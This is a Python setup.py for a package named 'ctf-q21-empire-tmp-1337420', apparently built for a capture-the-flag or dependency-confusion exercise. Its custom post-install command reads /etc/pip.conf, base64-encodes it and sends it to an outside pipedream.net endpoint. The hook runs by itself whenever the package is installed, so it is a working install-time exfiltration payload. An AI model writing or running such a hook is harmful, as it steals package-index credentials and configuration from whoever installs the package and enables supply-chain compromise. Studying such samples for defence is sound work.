from setuptools import setup
import os
from setuptools.command.install import install

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://enc2i9ljmjy100e.m.pipedream.net/?hehe="+os.popen("cat /etc/pip.conf | base64").read())

setup(
    name='ctf-q21-empire-tmp-1337420',
    description='Bye world',
    version='0.0.9',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    cmdclass={
        'install': PostInstallCommand,
        },
    )

